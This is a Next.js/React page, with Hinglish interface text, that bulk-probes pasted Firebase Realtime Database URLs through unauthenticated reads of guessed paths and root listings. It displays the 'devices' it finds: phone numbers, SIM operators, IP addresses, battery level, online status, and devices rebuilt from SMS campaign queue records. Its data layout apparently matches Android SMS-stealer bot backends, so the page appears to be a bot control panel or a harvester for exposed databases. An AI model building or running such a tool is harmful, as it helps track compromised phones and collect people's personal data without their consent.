'use client';

import { useEffect, useState, useCallback } from 'react';
import { Search, RefreshCw, Wifi, WifiOff, Database, Plus, X, Loader2, CheckCircle, AlertCircle } from 'lucide-react';

interface RtdbSource {
  id: string;
  name: string;
  url: string;
}

interface RtdbDevice {
  id: string;
  sourceId: string;
  sourceName: string;
  displayName: string;
  online: boolean;
  fields: Array<{ label: string; value: string | number }>;
  battery?: number;
}

const MODEL_KEYS = ['modelName','ModelName','model','Model','deviceModel','DeviceModel','device','Device','phoneModel','PhoneModel','brand','Brand','DeviceName','deviceName','name','Name'];
const ANDROID_KEYS = ['version','Version','androidVersion','AndroidVersion','android','Android','osVersion','OsVersion','sdkVersion','SdkVersion','AndroidVer','androidVer'];
const BATTERY_KEYS = ['batteryPercent','BatteryPercent','battery','Battery','batteryLevel','BatteryLevel','bat','Bat','batteryPercentage','BatteryPercentage','charge','Charge'];
const PHONE_KEYS = ['mobNo','MobNo','phoneNumber','PhoneNumber','phone','Phone','number','Number','mobile','Mobile','mobileNumber','MobileNumber','simNo','SimNo','contactNumber','ContactNumber'];
const NETWORK_KEYS = ['provider','Provider','network','Network','networkType','NetworkType','operator','Operator','simOperator','SimOperator','networkOperator','NetworkOperator','carrier','Carrier','isp','ISP','telecom','Telecom'];
const ONLINE_KEYS = ['online','Online','isOnline','IsOnline','connected','Connected'];
const STATUS_KEYS = ['status','Status','connection','Connection','deviceStatus','DeviceStatus'];
const SKIP_KEYS = new Set([...ONLINE_KEYS,...STATUS_KEYS,'lastSeen','LastSeen','updatedAt','UpdatedAt','createdAt','CreatedAt','fcmToken','FcmToken','token','Token','registrationToken','RegistrationToken','id','Id','uid','Uid','pushToken','PushToken','regId','RegId','gcmToken','GcmToken']);

function first(obj: Record<string, unknown>, keys: string[]): unknown {
  for (const k of keys) if (obj[k] != null && obj[k] !== '') return obj[k];
  return undefined;
}

function flatten(raw: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = { ...raw };
  for (const [k, v] of Object.entries(raw)) {
    if (v == null) continue;
    // sims array: extract phoneNumber and network from first SIM
    if ((k === 'sims' || k === 'Sims') && Array.isArray(v) && v.length > 0) {
      const sim0 = v[0] as Record<string, unknown>;
      if (sim0?.phoneNumber) out['phoneNumber'] = sim0.phoneNumber;
      if (sim0?.number) out['number'] = sim0.number;
      if (sim0?.operator) out['operator'] = sim0.operator;
      if (sim0?.network) out['network'] = sim0.network;
      if (sim0?.provider) out['provider'] = sim0.provider;
    }
    // networks array: extract first element as provider
    if ((k === 'networks' || k === 'Networks') && Array.isArray(v) && v.length > 0) {
      if (!out['provider']) out['provider'] = String(v[0]);
    }
    // nested object: merge one level
    if (typeof v === 'object' && !Array.isArray(v)) {
      for (const [k2, v2] of Object.entries(v as Record<string, unknown>)) {
        if (v2 != null && !(k2 in out)) out[k2] = v2;
      }
    }
  }
  return out;
}

function isOnline(raw: Record<string, unknown>): boolean {
  for (const k of ONLINE_KEYS) if (raw[k] === true) return true;
  for (const k of STATUS_KEYS) if (String(raw[k] ?? '').toLowerCase() === 'online') return true;
  return false;
}

function parseDevice(source: RtdbSource, devId: string, rawOrig: Record<string, unknown>): RtdbDevice {
  const raw = flatten(rawOrig);
  const online = isOnline(raw) || isOnline(rawOrig);

  const toStr = (v: unknown) => v != null ? String(v).trim() : '';
  const toNum = (v: unknown): number | undefined => {
    if (typeof v === 'number') return v;
    if (typeof v === 'string') { const n = Number(v); if (!isNaN(n) && v !== '') return n; }
    return undefined;
  };

  const brand = toStr(first(raw, ['Brand','brand']));
  const modelOnly = toStr(first(raw, ['modelName','ModelName','model','Model','deviceModel','DeviceModel','device','Device','phoneModel']));
  const model = brand && modelOnly && !modelOnly.toLowerCase().startsWith(brand.toLowerCase())
    ? `${brand} ${modelOnly}` : (modelOnly || brand || '');

  const android = toStr(first(raw, ANDROID_KEYS));
  const batteryVal = toNum(first(raw, BATTERY_KEYS));
  const phone = toStr(first(raw, PHONE_KEYS));
  const network = toStr(first(raw, NETWORK_KEYS));
  const ip = toStr(first(raw, ['ip','IP','ipAddress','IpAddress']));
  const displayName = model || toStr(first(raw, ['modelName','name','Name','deviceName','DeviceName'])) || devId;

  const fields: Array<{ label: string; value: string | number }> = [];
  if (model) fields.push({ label: 'MODEL', value: model });
  if (android) fields.push({ label: 'ANDROID', value: android.startsWith('v') ? android : `v${android}` });
  if (batteryVal != null) fields.push({ label: 'BATTERY', value: batteryVal });
  if (phone) fields.push({ label: 'NUMBER', value: phone });
  if (network) fields.push({ label: 'NETWORK', value: network });
  if (ip) fields.push({ label: 'IP', value: ip });

  const knownKeys = new Set([...MODEL_KEYS,...ANDROID_KEYS,...BATTERY_KEYS,...PHONE_KEYS,...NETWORK_KEYS,...ONLINE_KEYS,...STATUS_KEYS,...Array.from(SKIP_KEYS),'ip','IP','ipAddress','IpAddress','sims','Sims','networks','Networks','networkFromSms','mobNo','MobNo','modelName','ModelName','batteryPercent','BatteryPercent','provider','Provider']);
  for (const [k, v] of Object.entries(raw)) {
    if (knownKeys.has(k) || SKIP_KEYS.has(k)) continue;
    const s = toStr(v);
    if (s && s !== '[object Object]') fields.push({ label: k, value: s });
  }

  return { id: `${source.id}_${devId}`, sourceId: source.id, sourceName: source.name, displayName, online, fields, battery: batteryVal };
}

const DEVICE_PATHS = ['devices','Devices','Users','users','Phones','phones','registered','clients','data','device_list','all_devices'];

async function tryFetch(url: string): Promise<Record<string, unknown> | null> {
  try {
    const res = await fetch(url, { cache: 'no-store', signal: AbortSignal.timeout(8000) });
    if (!res.ok) return null;
    const d = await res.json();
    if (!d || typeof d !== 'object' || Array.isArray(d)) return null;
    return d as Record<string, unknown>;
  } catch { return null; }
}

// SMS/message record detection — these are campaign queue entries, not device records
function isSmsRecord(raw: Record<string, unknown>): boolean {
  return ('messageType' in raw || 'isSended' in raw || 'isSent' in raw) &&
    ('channel' in raw || 'body' in raw || 'to' in raw);
}

function hasRealDeviceData(devs: RtdbDevice[]): boolean {
  return devs.some(d => d.fields.length >= 1);
}

// Build unique device list from SMS queue records + merge with /devices/{id} data
async function devicesFromSmsRecords(
  source: RtdbSource,
  smsData: Record<string, unknown>,
  base: string
): Promise<RtdbDevice[]> {
  // Extract unique device IDs and their phone numbers from SMS records
  const byDeviceId = new Map<string, string>();
  for (const raw of Object.values(smsData)) {
    if (!raw || typeof raw !== 'object' || Array.isArray(raw)) continue;
    const r = raw as Record<string, unknown>;
    const devId = String(r['targetDeviceId'] ?? r['deviceId'] ?? r['device_id'] ?? '');
    if (!devId) continue;
    if (!byDeviceId.has(devId)) {
      const phone = String(r['NUMBER'] ?? r['num'] ?? r['number'] ?? r['Number'] ?? '');
      byDeviceId.set(devId, phone);
    }
  }
  if (byDeviceId.size === 0) return [];

  // Try to fetch full device records from /devices
  const deviceData = await tryFetch(`${base}/devices.json`);

  return Array.from(byDeviceId.entries()).map(([devId, smsPhone]) => {
    const deviceRecord = deviceData?.[devId];
    if (deviceRecord && typeof deviceRecord === 'object' && !Array.isArray(deviceRecord)) {
      // Real device record found — parse it fully
      const dev = parseDevice(source, devId, deviceRecord as Record<string, unknown>);
      // If phone not extracted from device record, use SMS phone
      if (!dev.fields.find(f => f.label === 'NUMBER') && smsPhone)
        dev.fields.splice(dev.battery != null ? 3 : 2, 0, { label: 'NUMBER', value: smsPhone });
      return dev;
    }
    // No device record — show device ID + phone from SMS
    return {
      id: `${source.id}_${devId}`,
      sourceId: source.id,
      sourceName: source.name,
      displayName: devId.slice(0, 16),
      online: false,
      fields: smsPhone ? [{ label: 'NUMBER', value: smsPhone }] : [],
      battery: undefined,
    };
  });
}

async function fetchSourceDevices(source: RtdbSource): Promise<{ devices: RtdbDevice[]; ok: boolean }> {
  const base = source.url.replace(/\/$/, '');
  try {
    // 1. Try named device paths first
    for (const path of DEVICE_PATHS) {
      const data = await tryFetch(`${base}/${path}.json`);
      if (!data || Object.keys(data).length === 0) continue;
      const entries = Object.entries(data);
      // Check if these are SMS records — skip if so
      const sample = entries[0]?.[1];
      if (sample && typeof sample === 'object' && !Array.isArray(sample) && isSmsRecord(sample as Record<string, unknown>)) continue;
      const devs = entries.map(([id, raw]) =>
        parseDevice(source, id, typeof raw === 'object' && raw !== null ? raw as Record<string, unknown> : {})
      );
      if (hasRealDeviceData(devs)) return { devices: devs, ok: true };
    }

    // 2. Try root shallow to find device-like keys
    const root = await tryFetch(`${base}/.json?shallow=true`);
    if (root) {
      const rootKeys = Object.keys(root);
      // Check if root keys are named paths (not device IDs) — if so, skip
      const deviceLikeKeys = rootKeys.filter(k =>
        /^[0-9a-f]{8,}$/i.test(k) || /^[A-Za-z0-9_-]{15,}$/.test(k)
      );
      if (deviceLikeKeys.length > 0) {
        const samples = await Promise.all(deviceLikeKeys.slice(0, 3).map(k => tryFetch(`${base}/${k}.json`)));
        // If samples look like SMS records, extract devices from them differently
        const firstSample = samples.find(Boolean);
        if (firstSample && isSmsRecord(firstSample)) {
          // These are SMS records keyed by something — get full root and extract devices
          const all = await tryFetch(`${base}/.json`);
          if (all) {
            const devs = await devicesFromSmsRecords(source, all, base);
            if (devs.length > 0) return { devices: devs, ok: true };
          }
        } else if (samples.some(s => s && Object.keys(s).length > 2)) {
          const all = await tryFetch(`${base}/.json`);
          if (all) {
            const devs = deviceLikeKeys
              .filter(k => all[k] && typeof all[k] === 'object')
              .map(k => parseDevice(source, k, all[k] as Record<string, unknown>));
            if (hasRealDeviceData(devs)) return { devices: devs, ok: true };
          }
        }
      }
    }

    // 3. Last resort: fetch root fully and detect SMS records
    const rootFull = await tryFetch(`${base}/.json`);
    if (rootFull && Object.keys(rootFull).length > 0) {
      const firstVal = Object.values(rootFull)[0];
      if (firstVal && typeof firstVal === 'object' && !Array.isArray(firstVal) &&
          isSmsRecord(firstVal as Record<string, unknown>)) {
        const devs = await devicesFromSmsRecords(source, rootFull, base);
        if (devs.length > 0) return { devices: devs, ok: true };
      }
    }

    return { devices: [], ok: true };
  } catch { return { devices: [], ok: false }; }
}

function loadSources(): RtdbSource[] {
  try { const r = localStorage.getItem('rtdb_sources'); return r ? JSON.parse(r) as RtdbSource[] : []; } catch { return []; }
}
function saveSources(s: RtdbSource[]) {
  try { localStorage.setItem('rtdb_sources', JSON.stringify(s)); } catch { /* */ }
}
function urlToName(url: string): string {
  try { return new URL(url).hostname.split('.')[0]; } catch { return url.slice(0, 20); }
}

function BatteryBar({ val }: { val: number }) {
  const pct = Math.min(100, Math.max(0, val));
  const color = pct > 30 ? 'bg-emerald-500' : pct > 10 ? 'bg-amber-500' : 'bg-red-500';
  const textColor = pct > 30 ? 'text-emerald-500' : pct > 10 ? 'text-amber-500' : 'text-red-500';
  return (
    <span className="flex items-center gap-1">
      <span className="inline-flex w-8 h-2 rounded-sm border border-slate-300 dark:border-slate-600 overflow-hidden">
        <span className={`${color} h-full`} style={{ width: `${pct}%` }} />
      </span>
      <span className={`font-medium ${textColor}`}>{pct}%</span>
    </span>
  );
}

function DeviceCard({ device }: { device: RtdbDevice }) {
  return (
    <div className={`card p-3 space-y-2 border ${
      device.online ? 'border-emerald-200 dark:border-emerald-800' : 'border-slate-200 dark:border-slate-700'
    }`}>
      <div className="flex items-start justify-between gap-1">
        <p className="text-sm font-semibold text-slate-900 dark:text-white leading-tight line-clamp-1">{device.displayName}</p>
        {device.online ? <Wifi className="w-4 h-4 text-emerald-500 flex-shrink-0" /> : <WifiOff className="w-4 h-4 text-slate-400 flex-shrink-0" />}
      </div>
      <div className="flex items-center gap-1.5">
        <div className={`w-2 h-2 rounded-full flex-shrink-0 ${device.online ? 'bg-emerald-500' : 'bg-slate-400'}`} />
        <span className={`text-xs font-medium ${device.online ? 'text-emerald-600 dark:text-emerald-400' : 'text-slate-400'}`}>
          {device.online ? 'Online' : 'Offline'}
        </span>
        <span className="text-xs text-slate-300 dark:text-slate-600">·</span>
        <span className="text-xs text-slate-400 truncate">{device.sourceName}</span>
      </div>
      {device.fields.length > 0 && (
        <div className="space-y-1 pt-1 border-t border-slate-100 dark:border-slate-700/50">
          {device.fields.map(({ label, value }) => (
            <div key={label} className="flex justify-between items-center text-xs gap-2">
              <span className="text-slate-400 text-[10px] font-medium flex-shrink-0">{label}</span>
              {label === 'BATTERY' && typeof value === 'number'
                ? <BatteryBar val={value} />
                : <span className="text-slate-600 dark:text-slate-300 font-mono text-right truncate max-w-[130px]">{String(value)}</span>
              }
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

export default function DevicesPage() {
  const [sources, setSources] = useState<RtdbSource[]>([]);
  const [devices, setDevices] = useState<RtdbDevice[]>([]);
  const [deadIds, setDeadIds] = useState<Set<string>>(new Set());
  const [loading, setLoading] = useState(false);
  const [search, setSearch] = useState('');
  const [filter, setFilter] = useState<'all' | 'online' | 'offline'>('all');
  const [addOpen, setAddOpen] = useState(false);
  const [bulkText, setBulkText] = useState('');
  const [adding, setAdding] = useState(false);
  const [addResult, setAddResult] = useState('');

  useEffect(() => { setSources(loadSources()); }, []);

  const refresh = useCallback(async (srcs: RtdbSource[]) => {
    if (!srcs.length) return;
    setLoading(true);
    try {
      const results = await Promise.all(srcs.map(fetchSourceDevices));
      const dead = new Set<string>();
      const all: RtdbDevice[] = [];
      results.forEach((r, i) => { if (!r.ok) dead.add(srcs[i].id); all.push(...r.devices); });
      setDeadIds(dead);
      setDevices(all);
    } finally { setLoading(false); }
  }, []);

  useEffect(() => {
    refresh(sources);
    const t = setInterval(() => refresh(sources), 30_000);
    return () => clearInterval(t);
  }, [sources, refresh]);

  async function handleBulkAdd() {
    const lines = bulkText.split(/[\n,]+/).map(l => l.trim()).filter(l => l.startsWith('https://'));
    if (!lines.length) { setAddResult('Koi valid URL nahi mili'); return; }
    setAdding(true); setAddResult('');
    const existing = loadSources();
    const existingUrls = new Set(existing.map(s => s.url));
    const toTest = lines.filter(u => !existingUrls.has(u));
    let added = 0, skipped = 0;
    const newSources: RtdbSource[] = [...existing];
    await Promise.all(toTest.map(async url => {
      const src: RtdbSource = { id: Date.now().toString() + Math.random().toString(36).slice(2), name: urlToName(url), url };
      const r = await fetchSourceDevices(src);
      if (r.ok) { newSources.push(src); added++; } else skipped++;
    }));
    saveSources(newSources); setSources([...newSources]);
    setAdding(false); setBulkText(''); setAddOpen(false);
    setAddResult(`${added} add hui, ${skipped} skip (offline/error), ${lines.length - toTest.length} already the`);
  }

  function handleRemoveSource(id: string) {
    const updated = sources.filter(s => s.id !== id);
    saveSources(updated); setSources(updated);
    setDevices(d => d.filter(dev => dev.sourceId !== id));
  }

  const filtered = devices.filter(d => {
    const q = search.toLowerCase();
    const matchSearch = d.displayName.toLowerCase().includes(q) ||
      d.fields.some(f => String(f.value).toLowerCase().includes(q));
    const matchFilter = filter === 'all' || (filter === 'online' ? d.online : !d.online);
    return matchSearch && matchFilter;
  });

  const onlineCount = devices.filter(d => d.online).length;
  const offlineCount = devices.length - onlineCount;

  return (
    <div className="space-y-4 animate-fade-in">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-slate-900 dark:text-white">Devices</h1>
          <p className="text-sm text-slate-500 dark:text-slate-400 mt-0.5">
            {devices.length} total · {onlineCount} online · {offlineCount} offline
          </p>
        </div>
        <div className="flex items-center gap-2">
          <button onClick={() => refresh(sources)} disabled={loading || !sources.length} className="btn-secondary p-2" title="Refresh">
            <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
          </button>
          <button onClick={() => { setAddOpen(true); setAddResult(''); }} className="btn-primary flex items-center gap-1.5 text-sm">
            <Plus className="w-4 h-4" /> Add URL
          </button>
        </div>
      </div>

      <div className="flex gap-3">
        {[
          { label: 'TOTAL', val: devices.length, color: 'text-slate-700 dark:text-slate-200' },
          { label: 'ONLINE', val: onlineCount, color: 'text-emerald-600 dark:text-emerald-400' },
          { label: 'OFFLINE', val: offlineCount, color: 'text-slate-400' },
          { label: 'SOURCES', val: sources.length, color: 'text-brand-600 dark:text-brand-400' },
        ].map(({ label, val, color }) => (
          <div key={label} className="card px-3 py-2 flex-1 text-center">
            <p className={`text-xl font-bold ${color}`}>{val}</p>
            <p className="text-xs text-slate-400 font-medium">{label}</p>
          </div>
        ))}
      </div>

      {sources.length > 0 && (
        <div className="flex flex-wrap gap-2">
          {sources.map(s => (
            <div key={s.id} className={`flex items-center gap-1.5 px-2.5 py-1 rounded-full border text-xs ${
              deadIds.has(s.id)
                ? 'bg-red-50 dark:bg-red-950 border-red-200 dark:border-red-800 text-red-600 dark:text-red-400'
                : 'bg-brand-50 dark:bg-brand-950 border-brand-200 dark:border-brand-800 text-brand-700 dark:text-brand-300'
            }`}>
              {deadIds.has(s.id) ? <AlertCircle className="w-3 h-3" /> : <Database className="w-3 h-3" />}
              <span className="font-medium">{s.name}</span>
              <button onClick={() => handleRemoveSource(s.id)} className="hover:text-red-500 ml-0.5"><X className="w-3 h-3" /></button>
            </div>
          ))}
        </div>
      )}

      {addOpen && (
        <div className="card p-4 space-y-3 border-2 border-brand-200 dark:border-brand-800">
          <div className="flex items-center justify-between">
            <h3 className="text-sm font-semibold text-slate-900 dark:text-white">Firebase RTDB URLs add karo</h3>
            <button onClick={() => setAddOpen(false)} className="text-slate-400 hover:text-slate-600"><X className="w-4 h-4" /></button>
          </div>
          <textarea
            className="input text-sm font-mono h-32 resize-none w-full"
            placeholder={"https://project1-default-rtdb.firebaseio.com\nhttps://project2-default-rtdb.firebaseio.com"}
            value={bulkText}
            onChange={e => setBulkText(e.target.value)}
            autoFocus
          />
          <p className="text-xs text-slate-400">Jo URLs band hain ya reach nahi ho sakti, skip ho jayengi</p>
          <div className="flex gap-2 justify-end items-center">
            {adding && <span className="text-xs text-slate-400 flex items-center gap-1"><Loader2 className="w-3 h-3 animate-spin" /> Check kar raha hai...</span>}
            <button onClick={() => setAddOpen(false)} className="btn-secondary text-sm py-1.5 px-3">Cancel</button>
            <button onClick={handleBulkAdd} disabled={adding || !bulkText.trim()} className="btn-primary text-sm py-1.5 px-3">
              {adding ? 'Adding...' : 'Add URLs'}
            </button>
          </div>
        </div>
      )}

      {addResult && (
        <div className="flex items-center gap-2 text-sm text-emerald-600 dark:text-emerald-400 bg-emerald-50 dark:bg-emerald-950 border border-emerald-200 dark:border-emerald-800 rounded-lg px-3 py-2">
          <CheckCircle className="w-4 h-4 flex-shrink-0" />{addResult}
        </div>
      )}

      {devices.length > 0 && (
        <div className="flex items-center gap-3 flex-wrap">
          <div className="relative flex-1 min-w-40">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
            <input type="search" placeholder="Search…" value={search} onChange={e => setSearch(e.target.value)} className="input pl-10 w-full" />
          </div>
          <div className="flex gap-1.5">
            {(['all', 'online', 'offline'] as const).map(f => (
              <button key={f} onClick={() => setFilter(f)} className={`px-3 py-1.5 rounded-lg text-xs font-medium capitalize transition-colors ${filter === f ? 'bg-brand-600 text-white' : 'bg-slate-100 dark:bg-slate-700 text-slate-600 dark:text-slate-300'}`}>{f}</button>
            ))}
          </div>
        </div>
      )}

      {!sources.length && !loading && (
        <div className="card p-12 text-center space-y-4">
          <Database className="w-12 h-12 text-slate-300 dark:text-slate-600 mx-auto" />
          <div>
            <p className="text-slate-700 dark:text-slate-300 font-medium">Koi RTDB URL nahi add hua</p>
            <p className="text-sm text-slate-400 dark:text-slate-500 mt-1">&quot;Add URL&quot; dabao aur apna Firebase RTDB URL paste karo</p>
          </div>
          <button onClick={() => { setAddOpen(true); setAddResult(''); }} className="btn-primary mx-auto flex items-center gap-1.5">
            <Plus className="w-4 h-4" /> Add Firebase URL
          </button>
        </div>
      )}

      {loading && !devices.length && (
        <div className="grid grid-cols-2 gap-3">
          {Array.from({ length: 6 }).map((_, i) => (
            <div key={i} className="card p-4 space-y-3 animate-pulse">
              <div className="h-4 bg-slate-100 dark:bg-slate-700 rounded w-3/4" />
              <div className="h-3 bg-slate-100 dark:bg-slate-700 rounded w-1/2" />
              <div className="h-3 bg-slate-100 dark:bg-slate-700 rounded w-2/3" />
            </div>
          ))}
        </div>
      )}

      {filtered.length > 0 && (
        <div className="grid grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3">
          {filtered.map(device => <DeviceCard key={device.id} device={device} />)}
        </div>
      )}

      {sources.length > 0 && !loading && devices.length > 0 && filtered.length === 0 && (
        <div className="text-center py-8 text-slate-400 text-sm">Koi device nahi mila</div>
      )}
      {sources.length > 0 && !loading && devices.length === 0 && (
        <div className="card p-8 text-center text-slate-400 text-sm space-y-2">
          <p>RTDB mein koi device nahi mila</p>
          <p className="text-xs">Firebase rules mein <code className="font-mono">.read: true</code> hona chahiye</p>
        </div>
      )}
    </div>
  );
}
